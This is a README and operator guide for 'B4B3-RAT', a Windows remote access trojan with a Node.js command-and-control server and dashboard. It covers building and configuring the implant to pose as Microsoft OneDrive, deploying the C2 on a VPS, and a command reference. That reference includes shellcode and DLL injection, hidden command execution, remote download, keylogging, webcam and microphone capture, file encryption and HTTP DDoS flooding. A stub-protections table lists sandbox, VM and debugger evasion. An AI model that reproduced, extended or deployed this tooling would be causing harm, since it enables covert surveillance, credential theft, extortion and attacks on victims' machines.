# B4B3-RAT — C2 Framework

A Windows C++ remote administration tool with a Node.js C2 server and web dashboard.

> **Full operator guide:** [`docs/guide.html`](docs/guide.html) — open in any browser.

---

## Architecture

```
Stub.exe  ──── HTTP ────▶  C2 Server :4444  ◀────  Browser (Dashboard)
              /checkin                               /login.html
              /cmd                                  /index.html
              /result                               /api/auth/*
              /upload                               /api/bots/*
              /event
```

| Component | Folder | Stack |
|-----------|--------|-------|
| C2 Server | `c2-server/` | Node.js + Express |
| Dashboard | `c2-dashboard/` | HTML/JS (served by backend) |
| Stub | `B4B3-RAT/Stub/` | C++ (MinGW g++) |
| Builder | `B4B3-RAT/Builder/` | C++ Windows GUI |

---

## Quick Start

### 1 — Build Stub.exe

```powershell
cd "B4B3-RAT\Stub"
powershell -ExecutionPolicy Bypass -File build.ps1
```

**Requires:** MinGW g++ at `C:\MinGW\bin\`, CryptoPP at `D:\CryptoPP\` (with `libcryptopp.a`).

### 2 — Configure stub with Builder

Open the Builder GUI, fill in:
- **C2 Host** — VPS IP (no `http://`, no port) e.g. `2.24.160.60`
- **Port** — `4444`
- **Auth Key** — must match `C2_AUTH` env var on server
- **Delay** — poll interval in ms (e.g. `3000`)
- **Drop Path** — where to install on target (e.g. `C:\Users\Public\OneDriveHelper.exe`)

Click **Build** → produces `Stub_configured.exe`.

### 3 — Deploy C2 Server (VPS)

```bash
git clone https://github.com/MunibAhmad-dev/B4B3.git
cd B4B3/c2-server
npm install

# Start with PM2
C2_AUTH=yourkey ADMIN_PASS=yourpassword C2_PORT=4444 \
  pm2 start server.js --name c2-server

pm2 save && pm2 startup
```

> **Do NOT place `cert.pem`/`key.pem` in `c2-server/`** — their presence switches to HTTPS, breaking the stub (stub uses plain HTTP only).

### 4 — Open firewall on VPS

Hostinger VPS2: hPanel → Firewall → Add TCP rule for port `4444` → **Synchronize**.

### 5 — Access dashboard

```
http://<VPS-IP>:4444/login.html
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `C2_AUTH` | `changeme` | Bot auth key — must match what's baked into the stub |
| `ADMIN_PASS` | `admin123` | Dashboard login password |
| `C2_PORT` | `4444` | Server port |
| `CORS_ORIGIN` | *(empty)* | Leave empty — dashboard is served by the backend |

---

## Updating Stub After Code Changes

```powershell
# 1. Rebuild
cd "B4B3-RAT\Stub"
powershell -ExecutionPolicy Bypass -File build.ps1

# 2. Open Builder → click Build again (re-patches the new Stub.exe)

# 3. Distribute the new Stub_configured.exe
```

## Updating Server on VPS

```bash
cd ~/B4B3/c2-server
git pull
npm install        # only if package.json changed
pm2 restart c2-server
```

---

## Commands Reference

<details>
<summary>View all stub commands</summary>

### Process Manager
| Command | Parameters | Description |
|---------|-----------|-------------|
| `processes` | | Get process list |
| `closeproc` | `[process.exe]` | Close a process |
| `inject_dll` | `[process.exe] [C:\path\to.dll]` | Inject DLL into process |
| `inject_shell` | `[process.exe] [shellcode]` | Inject shellcode into process |

### File Manager
| Command | Parameters | Description |
|---------|-----------|-------------|
| `dir show` | `[C:\Folder]` | List files in directory |
| `dir del_file` | `[C:\path\file.exe]` | Delete a file |
| `dir read` | `[C:\path\file.txt]` | Read file contents |
| `dir write` | `[C:\path\file.txt] [text]` | Write text to file |

### Service Manager
| Command | Parameters | Description |
|---------|-----------|-------------|
| `service show` | | List all services/drivers |
| `service add` | `[Name] [Display] [Path] [Type] [StartType]` | Add a service |
| `service delete` | `[Name]` | Delete a service |
| `service start` | `[Name]` | Start a service |
| `service stop` | `[Name]` | Stop a service |

### System Control
| Command | Description |
|---------|-------------|
| `screenshot` | Take screenshot, upload to C2 |
| `webcam capture` | Capture webcam frame, upload to C2 |
| `mic record <seconds>` | Record microphone (1–60s), upload to C2 |
| `system [cmd args]` | Run cmd.exe with arguments (hidden) |
| `run [C:\file.exe] [args]` | Execute a file |
| `loader [URL] [C:\dest]` | Download file from URL to path |
| `disable pc` | Shutdown the machine |
| `disable display` | Turn off the monitor |
| `close` | Exit the stub process |

### Keylogger
| Command | Description |
|---------|-------------|
| `keylog start` | Start capturing keystrokes |
| `keylog stop` | Stop capturing |
| `keylog dump` | Send buffered keystrokes to C2 |
| `keylog status` | Check if keylogger is running |

### File Cryptor
| Command | Parameters | Description |
|---------|-----------|-------------|
| `filecrypt` | `[C:\file.exe] [key]` | Encrypt file with AES-256 |
| `filedecrypt` | `[C:\file.exe.b4db4b3] [key]` | Decrypt file |

### BotNet (DDoS)
| Command | Parameters | Description |
|---------|-----------|-------------|
| `botnet start` | `[https://target.com]` | Flood target with HTTP requests |
| `botnet stop` | | Stop the flood |

</details>

<details>
<summary>Service manager type values</summary>

**Type:**
| String | Value |
|--------|-------|
| `win32-service` | SERVICE_WIN32 |
| `kernel-driver` | SERVICE_DRIVER |
| `adapter-service` | SERVICE_ADAPTER |
| `interactive-process` | SERVICE_INTERACTIVE_PROCESS |

**StartType:**
| String | Value |
|--------|-------|
| `auto-start` | SERVICE_AUTO_START |
| `boot-start` | SERVICE_BOOT_START |
| `demand-start` | SERVICE_DEMAND_START |
| `disabled` | SERVICE_DISABLED |
| `system-start` | SERVICE_SYSTEM_START |

</details>

---

## Stub Protections

| Protection | Details |
|-----------|---------|
| Version info resource | Binary reports `Microsoft Corporation / Microsoft OneDrive` in file properties |
| Registry key | Uses `Software\Microsoft\OneDriveSync` (not the original known-signature key) |
| No debug artefacts | Removed writes to `C:\Users\Public\stub_dbg.txt` and `wcam_dbg.txt` |
| Hypervisor detection | CPUID bit 31 check — exits if running inside VM/sandbox |
| Sleep acceleration check | Detects AV sandbox time-skipping — exits if 500ms sleep returns in <400ms |
| Anti-debug | `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, process name + window title scan |
| Persistent Bot ID | ID stored in registry on first run, reused on restarts — no duplicate bots |

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Infinite duplicate bots | Rebuild stub — old binary generated new random ID on every restart |
| Stub runs but no bots in dashboard | Check auth key matches `C2_AUTH`. Test: `curl http://<VPS>:4444/ping?auth=<key>` |
| Server switches to HTTPS | Delete `cert.pem`/`key.pem` from `c2-server/` and restart |
| `EADDRINUSE :4444` | `pm2 delete c2-server` then restart |
| Build fails — undefined reference | Add the missing `-l<lib>` flag to `build.ps1` |

---

## License

MIT — see [LICENSE](https://mit-license.org/)
